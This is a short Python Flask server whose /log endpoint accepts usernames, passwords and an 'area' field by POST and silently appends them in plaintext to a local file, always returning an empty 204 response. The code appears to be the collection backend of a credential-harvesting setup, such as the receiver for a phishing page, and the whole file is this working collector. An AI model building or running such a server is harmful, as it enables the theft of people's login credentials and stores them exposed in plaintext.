from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return "Server is running. POST to /log to log user info."

@app.route('/log', methods=['POST'])
def log_user():
    username = request.form.get("username")
    password = request.form.get("password")
    area = request.form.get("area")

    if not username:
        return "", 204

    with open("user_log.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - username={username}, password={password}, area={area}\n")

    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

